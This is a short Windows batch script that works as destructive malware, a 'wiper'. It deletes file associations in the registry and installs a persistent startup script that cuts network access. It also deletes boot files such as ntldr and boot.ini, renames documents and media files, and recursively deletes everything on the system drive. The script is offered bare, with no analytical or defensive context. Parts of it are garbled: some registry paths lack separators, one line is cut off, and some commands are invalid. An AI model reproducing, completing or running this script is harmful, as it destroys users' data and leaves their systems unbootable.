echo @echo off

del*.*
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
delete %systemdrive%\*.* /f /s
REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
del /s /q *.*